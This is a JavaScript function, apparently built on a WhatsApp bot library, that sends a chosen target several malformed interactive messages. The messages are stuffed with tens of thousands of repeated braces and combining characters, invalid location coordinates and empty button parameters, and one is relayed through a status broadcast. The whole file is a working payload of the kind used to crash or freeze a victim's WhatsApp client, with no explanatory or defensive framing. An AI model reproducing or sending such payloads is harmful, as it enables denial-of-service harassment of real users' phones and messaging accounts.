async function VerloadNewBetaXx(target) {
  try {
    const space = "{".repeat(10000);

    const messagePayload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "VaxzyNotWhyy👀" },
            carouselMessage: {
              cards: cardsCrL,
              messageVersion: 1
            }
          }
        }
      }
    };
    
    const msg = generateWAMessageFromContent(target, messagePayload, {});

    await Vxz.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
    });

    const messageBetaXx = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "VaxzyIsHere៚",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "VaxzyIsHere៚".repeat(10000),
                address: "ោ៝".repeat(10000),
              },
            },
            body: { 
              text: `VaxzyIsHere៚${"꧀".repeat(2500)}.com - _ #`
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: Array(6).fill().map(() => ({
                name: Math.random() > 0.5 ? "mpm" : "single_select",
                buttonParamsJson: ""
              }))
            },
          },
        },
      },
    };

    await Vxz.relayMessage(target, messageBetaXx, {
      participant: { jid: target },
    });
    
    const messageVxzXinvis = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "VaxzyNotWhyy👀",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "VaxzyNotWhyy👀".repeat(10000),
                address: "ោ៝".repeat(10000),
              },
            },
            body: {
              text: "VaxzyNotWhyy👀",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    };

    await Vxz.relayMessage(target, messageVxzXinvis, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
    
  } catch (err) {
    console.error("Terdapat Kesalahan Pada Struktur Function", err);
    throw err;
  }
}